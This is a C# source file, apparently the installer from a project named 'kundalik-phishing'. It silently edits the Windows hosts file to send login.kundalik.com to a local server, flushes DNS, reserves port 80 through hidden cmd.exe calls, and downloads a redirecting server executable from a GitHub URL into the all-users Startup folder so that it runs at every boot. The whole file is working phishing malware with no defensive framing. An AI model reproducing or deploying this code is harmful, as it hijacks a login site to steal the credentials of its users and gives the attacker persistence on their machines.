using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace ServerRedirecting
{
    internal class Starter
    {
        const string Phishing = "127.0.0.1";
        const string Target = "login.kundalik.com";
        const string URL = "https://github.com/Ulu-pro/kundalik-phishing/raw/main/program/ServerRedirecting.exe";
        const string StartUp = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\";
        const string Hosts = @"C:\Windows\System32\drivers\etc\hosts";
        const string Server = @"ServerRedirecting.exe";

        public Starter()
        {
            try
            {
                BaseMethod();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.ReadKey();
            }
        }

        public void RunCMD(string cmd)
        {
            Process process = new Process();
            ProcessStartInfo info = new ProcessStartInfo();
            info.WindowStyle = ProcessWindowStyle.Hidden;
            info.FileName = "cmd.exe";
            info.Arguments = $"/C {cmd}";
            process.StartInfo = info;
            process.Start();
        }

        public void BaseMethod()
        {
            using (StreamWriter file = File.AppendText(Hosts))
                file.WriteLine($"\n{Phishing} {Target}");

            string UserName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            RunCMD("ipconfig /flushdns");
            RunCMD($"netsh http add urlacl url=http://127.0.0.1:80/ user={UserName}");

            using (WebClient client = new WebClient())
                client.DownloadFile(URL, StartUp + Server);
        }
    }
}
